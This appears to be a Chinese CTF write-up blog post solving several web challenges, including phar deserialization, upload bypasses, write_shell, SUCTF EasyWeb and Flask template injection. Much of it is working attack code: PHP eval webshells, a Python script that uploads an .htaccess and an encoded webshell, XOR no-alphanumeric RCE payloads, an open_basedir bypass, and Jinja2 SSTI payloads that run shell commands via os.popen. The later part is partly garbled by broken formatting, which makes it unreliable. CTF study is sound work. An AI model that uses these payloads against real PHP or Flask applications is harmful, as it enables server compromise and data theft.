href=&quot;index.php&quot;&gt;首页&lt;/a&gt;         &lt;/div&gt;             &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt;                 &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt;                 &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;上传文件&lt;/a&gt;&lt;/li&gt;             &lt;/ul&gt;             &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt;                 &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;/a&gt;&lt;/li&gt;             &lt;/ul&gt;         &lt;/div&gt;     &lt;/nav&gt; &lt;/body&gt; &lt;/html&gt; &lt;!--flag is in f1ag.php--&gt;</code></pre><p>file.php</p><pre><code class="php">首页    查看文件    上传文件    10.244.80.46&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); $file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123;     $show-&gt;source = $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#39;file doesn\&#39;t exists.&#39;); &#125; ?&gt;  </code></pre><p>upload_file.php</p><pre><code class="php">222.90.67.205&lt;?php include &#39;function.php&#39;; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest=&quot;utf-8&quot;&gt; &lt;title&gt;文件上传&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div align = &quot;center&quot;&gt;         &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; &lt;/div&gt; &lt;style&gt;     p&#123; margin:0 auto&#125; &lt;/style&gt; &lt;div&gt; &lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;     &lt;label for=&quot;file&quot;&gt;文件名:&lt;/label&gt;     &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;     &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;/div&gt; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;</code></pre><p>function.php</p><pre><code class="php">222.90.67.205&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     //mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload/&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);     echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#39;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension = end($temp);     if(empty($extension)) &#123;         //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;;             return false;         &#125;     &#125; &#125; ?&gt; </code></pre><p>class.php</p><pre><code class="php"> &lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;            &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;?&gt; </code></pre><p>我们是无法利用文件读取来读取flag的。class.php一看就是反序列化，但是所有的代码里面都没有unserialize方法。有文件上传点，且phar协议没有过滤，那么就应该考察的是利用phar协议来进行反序列化逃逸，那我们就要尝试来构造poc链。</p><p>首先确定终点，它应该是可以读取文件的一个方法，我们锁定file_get方法</p><pre><code>$text = base64_encode(file_get_contents($value));</code></pre><p>我们就可以向这个方法中传入我们需要读取的文件路径就可以了。</p><p>思路:</p><pre><code>对象销毁，调用__destruct()方法，最后会echo一个值，令$C1e4r-&gt;str=$Show,这样就会调用show对象的__toString()方法，再令$Show-&gt;str[&#39;str&#39;]=$Test,test对象中并没有source，所以会调用get方法，令Test-&gt;params[source] = &quot;/var/www/html/f1ag.php&quot;,就可以成功读取flag</code></pre><p>poc链</p><pre><code class="php">&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;&#125;class Test&#123;    public $file;    public $params;&#125;$c1e4r = new C1e4r();$show = new Show();$test = new Test();$c1e4r-&gt;str = $show;$show-&gt;str[&#39;str&#39;]=$test;$test-&gt;params[&#39;source&#39;] = &quot;/var/www/html/f1ag.php&quot;;$phar = new Phar(&quot;sakura.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($c1e4r);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt;</code></pre><p>在本地搭建php环境，然后访问，会生成一个phar文件</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330214617285.png" alt="image-20220330214617285"></p><p>接下来要把这个文件上传到目标服务器，但是只允许图片进行上传</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330214739536.png" alt="image-20220330214739536"></p><p>所以我们把后缀改为.gif，这并不会影响phar文件的解析</p><p>接下来要得到我们上传文件的路径</p><pre><code>$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); </code></pre><p>对文件名和远程地址进行md5加密，后缀加上jpg，由此得到文件名</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220208000.png" alt="image-20220330220208000"></p><pre><code>0b0c73463194f72e78079b81d921c8f4.jpg路径为:xxx/upload/0b0c73463194f72e78079b81d921c8f4.jpg</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220359594.png" alt="image-20220330220359594"></p><p>payload</p><pre><code>http://2895a638-1834-4f93-8e10-962056e63a83.node4.buuoj.cn:81/file.php?file=phar://upload/0b0c73463194f72e78079b81d921c8f4.jpg</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220521789.png" alt="image-20220330220521789"></p><p>解密一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220555486.png" alt="image-20220330220555486"></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>简单文件上传，进去后注册账号，登录。</p><p>可以直接上传PHP文件</p><p>ma.php</p><pre><code>GIF89a&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;x&#39;]);&lt;/script&gt;</code></pre><p>然后复制图片链接，到蚁剑中连接</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331141935935.png" alt="image-20220331141935935"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331141947473.png" alt="image-20220331141947473"></p><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331142206699.png" alt="image-20220331142206699"></p><p>查看源代码</p><pre><code class="php"> &lt;?phperror_reporting(0);if (isset($_GET[&#39;source&#39;])) &#123;  show_source(__FILE__);  exit();&#125;function is_valid($str) &#123;  $banword = [    // no path traversal    &#39;\.\.&#39;,    // no stream wrapper    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,    // no data exfiltration    &#39;flag&#39;  ];  $regexp = &#39;/&#39; . implode(&#39;|&#39;, $banword) . &#39;/i&#39;;  if (preg_match($regexp, $str)) &#123;    return false;  &#125;  return true;&#125;$body = file_get_contents(&#39;php://input&#39;); #body获取post数据,后面会对这进行$json = json_decode($body, true); #对获取得数据进行解码if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) &#123; #判断body是否有效，是否存在json数据，是否存在json[&#39;page&#39;]数据   $page = $json[&#39;page&#39;];  $content = file_get_contents($page); #读取page中得内容  if (!$content || !is_valid($content)) &#123;    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;  &#125;&#125; else &#123;  $content = &#39;&lt;p&gt;invalid request&lt;/p&gt;&#39;;&#125;// no data exfiltration!!!$content = preg_replace(&#39;/HarekazeCTF\&#123;.+\&#125;/i&#39;, &#39;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#39;, $content);#匹配过滤关键字ctfecho json_encode([&#39;content&#39; =&gt; $content]); #将content进行json编码并输出</code></pre><p>在json中，字符Unicode编码之后等同于该字符，比如php等同于\u0070\u0068\u0070。</p><p>构造payload</p><pre><code>php://filter/read=convert.base64-encode/resource=/flag</code></pre><p>编码下</p><pre><code>\u0070\u0068\u0070://filter/read=convert.base64-encode/resource=/\u0066\u006c\u0061\u0067</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331161734671.png" alt="image-20220331161734671"></p><p>解码</p><pre><code>flag&#123;06495870-7a10-4628-b799-e860b1b58477&#125;</code></pre><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><pre><code class="php">&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123;    if(preg_match(&quot;/&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;        // if(preg_match(&quot;/&#39;| |_|=|php/&quot;,$input))&#123;        die(&#39;hacker!!!&#39;);    &#125;else&#123;        return $input;    &#125;&#125;function waf($input)&#123;  if(is_array($input))&#123;      foreach($input as $key=&gt;$output)&#123;          $input[$key] = waf($output);      &#125;  &#125;else&#123;      $input = check($input);  &#125;&#125;$dir = &#39;sandbox/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;/&#39;;if(!file_exists($dir))&#123;    mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;    case &#39;pwd&#39;:        echo $dir;        break;    case &#39;upload&#39;:        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;        waf($data);        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt;</code></pre><p>代码审计</p><p><code>$a ?? 0 等同于 isset($a) ? $a : 0。</code></p><p>首先爆出路径</p><pre><code class="php">http://f6e38646-bc70-457d-9523-4bfbda2e6c4f.node4.buuoj.cn:81?action=pwd/sandbox/cc551ab005b2e60fbdc88de809b2c4b1/index.php</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331214929182.png" alt="image-20220331214929182"></p><p>这道题考察的就是shell的写入，但是它过滤了不少关键词</p><p>其中过滤了php这个关键词，但是这个可以进行绕过</p><pre><code>PHP中有两种短标签，&lt;??&gt;和&lt;?=?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?=?&gt;则是相当于&lt;? echo&gt;大部分文章说短标签需要在php.ini中设置short_open_tag为on才能开启短标签(默认是开启的，但似乎又默认注释，所以还是等于没开启)。但实际上在PHP5.4以后，无论short_open_tag是否开启，&lt;?=?&gt;这种写法总是适用的，&lt;??&gt;这种写法则需要short_open_tag开启才行。</code></pre><pre><code>过滤了空格‘ ’可以用 \t或者%09(需要php环境) 代替</code></pre><p>构造payload</p><pre><code>http://f6e38646-bc70-457d-9523-4bfbda2e6c4f.node4.buuoj.cn:81?action=upload&amp;data=&lt;?=%09`cat%09/*`?&gt;</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331225308163.png" alt="image-20220331225308163"></p><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><pre><code class="php">&lt;?phpfunction get_the_flag()&#123;    // webadmin will remove your upload file every 20 min!!!!     $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);         if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path= $userdir.&quot;/&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh = @$_GET[&#39;_&#39;];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123;    die(&#39;One inch long, one inch strong!&#39;);&#125;if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, $hhh) )    die(&#39;Try something else!&#39;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;</code></pre><p>代码审计</p><p>源码贴上来：</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150538110.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150538110.png" alt="image-20220210150538110"></a></p><p>代码其实可以分为两部分，第一部分是文件上传，第二部分是rce。</p><p>我们先来尝试一下rce，好家伙，过滤了很多东西啊。</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150849473.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150849473.png" alt="image-20220210150849473"></a></p><p>由此判断，这是无字母无数字rce，有三个思路</p><p>1、异或</p><p>2、取反</p><p>3、自增</p><p>由于这里对字符的长度有限制</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150949879.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150949879.png" alt="image-20220210150949879"></a></p><p>故采用异或。</p><p>这里贴上大神的脚本</p><pre><code>&lt;?phpfunction finds($string)&#123;    $index = 0;    $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];    for($i=27;$i&lt;count($a);$i++)&#123;        for($j=27;$j&lt;count($a);$j++)&#123;            $x = $a[$i] ^ $a[$j];            for($k = 0;$k&lt;strlen($string);$k++)&#123;                if(ord($string[$k]) == $x)&#123;                    echo $string[$k].&quot;\n&quot;;                    echo &#39;%&#39; . dechex($a[$i]) . &#39;^%&#39; . dechex($a[$j]).&quot;\n&quot;;                    $index++;                    if($index == strlen($string))&#123;                        return 0;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;finds(&quot;_GET&quot;);?&gt;</code></pre><p>运行如图</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210151113658.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210151113658.png" alt="image-20220210151113658"></a></p><p>由此我们可构造payload：</p><pre><code>http://127.0.0.1?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&%86=phpinfo```[![image-20220210152555350](ctf刷题-第一周题目/image-20220210152555350.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152555350.png)成功出来phpinfo，看一看有没有可以利用的点[![image-20220210152650640](ctf刷题-第一周题目/image-20220210152650640.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152650640.png)发现执行系统的命令全被禁用了，看来rce走不通了。这里顺带提一嘴，在buu的环境中存在非预期解，flag直接在phpinfo里了[![image-20220210152821670](ctf刷题-第一周题目/image-20220210152821670.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152821670.png)不过还是按照做题的套路来吧，真正的比赛应该不会出现这种情况。既然rce走不通，那就试一试文件上传吧[![image-20220210152933281](ctf刷题-第一周题目/image-20220210152933281.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152933281.png)各种限制非常多，这里限制了上传php后缀的文件，所以要想办法绕过，最先想到的就算.htaccess解析。但是上传.htaccess仍然有[![image-20220210204915083](ctf刷题-第一周题目/image-20220210204915083.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210204915083.png)这个函数限制。解决这个函数，采用xbm格式，X Bit Map```在计算机图形学中，X Window系统使用X BitMap（XBM），一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图XBM数据由一系列包含单色像素数据的静态无符号字符数组组成。当格式被普遍使用时，XBM通常出现在标题（.h文件）中，每个图像在标题中存储一个数组。以下C代码示例了一个XBM文件：#define test_width 16#define test_height 7static char test_bits[] = &#123;0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 &#125;;```在这个c文件中高和宽都是有#在前面的，那么我们即使把它放在.htaccess文件中也不会影响.htaccess的实际运行效果。所以我们在.htaccess里加上```#define width 1337#define height 1337..........```就可以绕过绕过这个函数了。上传.htaccess文件后，要上传一个非php后缀的一句话木马，但本题中仍然对<?进行了检测。这里有两种方法可以绕过。1、对一句话木马的内容进行base64编码。2、使用 utf-16be 来绕过下面先附上两种方法的exp：1、```import requestsimport base64htaccess = b"""#define width 1337#define height 1337 AddType application/x-httpd-php .ahhhphp_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ahhh""""shell = b"GIF89a12" + base64.b64encode(b"<?php eval($_REQUEST['cmd']);?>")#这里的GIF8912后面的12是为了符合base64 8个字节的编码规范url = "http://95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&%86=get_the_flag"files = &#123;'file':('.htaccess',htaccess,'image/jpeg')&#125;data = &#123;"upload":"Submit"&#125;response = requests.post(url=url, data=data, files=files)print(response.text)files = &#123;'file':('shell.ahhh',shell,'image/jpeg')&#125;response = requests.post(url=url, data=data, files=files)print(response.text)```本题php环境为7.2，所以无法使用`<script language="php">eval($_REQUEST['shell']);</script>`这条payload,所以将shell.ha进行base64编码之后，在.htaccess文件中利用filter://协议将文件解码，从而达到传入shell的目的。得到[![image-20220210212049717](ctf刷题-第一周题目/image-20220210212049717.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212049717.png)2、```SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"def generate_php_file(filename, script):    phpfile = open(filename, 'wb')     phpfile.write(script.encode('utf-16be'))    phpfile.write(SIZE_HEADER)    phpfile.close()def generate_htacess():    htaccess = open('.htaccess', 'wb')    htaccess.write(SIZE_HEADER)    htaccess.write(b'AddType application/x-httpd-php .lethe\n')    htaccess.write(b'php_value zend.multibyte 1\n')    htaccess.write(b'php_value zend.detect_unicode 1\n')    htaccess.write(b'php_value display_errors 1\n')    htaccess.close()        generate_htacess()generate_php_file("shell.lethe", "<?php eval($_GET['cmd']); die(); ?>")```同理上传即可[![image-20220210212639842](ctf刷题-第一周题目/image-20220210212639842.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212639842.png)一句话木马成功利用。使用蚁剑成功连接[![image-20220210212824536](ctf刷题-第一周题目/image-20220210212824536.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212824536.png)但是无法访问根目录。非预期解：采用蚁剑自带插件进行绕过.[![image-20220210213427872](ctf刷题-第一周题目/image-20220210213427872.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210213427872.png)预期解：绕过open_basedir这里由于涉及的内容我还不太理解，所以这里直接放出payload，有兴趣的大佬可以深入研究一下。```chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir("/"));```[![image-20220210214135619](ctf刷题-第一周题目/image-20220210214135619.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214135619.png)所有文件被列举出来了，下面读取flag值就可以了。[![image-20220210214447849](ctf刷题-第一周题目/image-20220210214447849.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214447849.png)## [RootersCTF2019]I_<3_Flask 10 11 15 2021 2022 这道题是模板注入。 [![image-20220211102608147](ctf刷题-第一周题目 image-20220211102608147.png)](https: sakurahack-y.github.io 02 rootersctf2019-i-3-flask-0x70-0x7f image-20220211102608147.png) 首先查看源代码，并没有什么用。 [![image-20220211102910418](ctf刷题-第一周题目 image-20220211102910418.png)](https: image-20220211102910418.png) dirsearch爆破一下，什么也没有。 [![image-20220211102929099](ctf刷题-第一周题目 image-20220211102929099.png)](https: image-20220211102929099.png) 本题是flask类题目，ctf常考点不过就是模板注入，所以我们需要寻找可注入参数，本地并没有给出，需要我们自己去爆破。 我们这里采用arjun工具进行爆破。工具链接：https: github.com s0md3v arjun [![image-20220211110028885](ctf刷题-第一周题目 image-20220211110028885.png)](https: image-20220211110028885.png)最终可爆破出来参数name。 [![image-20220211105238512](ctf刷题-第一周题目 image-20220211105238512.png)](https: image-20220211105238512.png) [![image-20220211105250064](ctf刷题-第一周题目 image-20220211105250064.png)](https: image-20220211105250064.png) 测试了一下的确存在模板注入。 接下来就是对漏洞的利用。 **漏洞利用** **1、工具tplmap** [![image-20220211110242684](ctf刷题-第一周题目 image-20220211110242684.png)](https: image-20220211110242684.png) [![image-20220211110254561](ctf刷题-第一周题目 image-20220211110254561.png)](https: image-20220211110254561.png) 成功，发现为jinja2模板，在ctf题目中经常考察 直接–os-shell拿下shell，读取flag [![image-20220211110436293](ctf刷题-第一周题目 image-20220211110436293.png)](https: image-20220211110436293.png) **2、手工利用** 只会工具当然不行，有时候工具无法成功，就需要自己手动测试，所以如何手撸也是需要掌握的。 具体可参考这篇文章，东西很多且杂，写给自己看的大佬别喷我。 [https: ssti-flak%e6%a1%86%e6%9e%b6 ](https: ssti-flak框架 ) 首先给几个比较通用的payload ``` http: b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81 ?name="&#123;%" for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__="='catch_warnings'" %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif endfor %&#125; [![image-20220211111654284](ctf刷题-第一周题目 image-20220211111654284.png)](https: image-20220211111654284.png) [].__class__.__base__.__subclasses__() &#123;% 'catch_warnings' b c.__init__.__globals__.values() b.__class__="=" &#123;&#125;.__class__ 'eval' b.keys() &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125; < code></3_Flask></code></pre><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111724780.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211111724780.png" alt="image-20220211111724780"></a></p><p>然后我们再讲一讲自己如何撸出来一个payload，做法就是寻找可利用的类。</p><p>1、有popen()的类</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2、有os模块的</p><p>socket._socketobject（一般在71）、site._Printer等模块</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3、有builtins的类</p><p>__ builtins __代码执行（最常用的方法）</p><p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p><p>__ builtins __   是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins   __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__   builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p><p>好了，接下来进行实践。</p><p>我们把所有子类列出来</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112131255.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112131255.png" alt="image-20220211112131255"></a></p><p>好家伙出来了很多啊，我们只需要找到我们需要的就好，我们用python脚本跑一下</p><pre><code>import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class 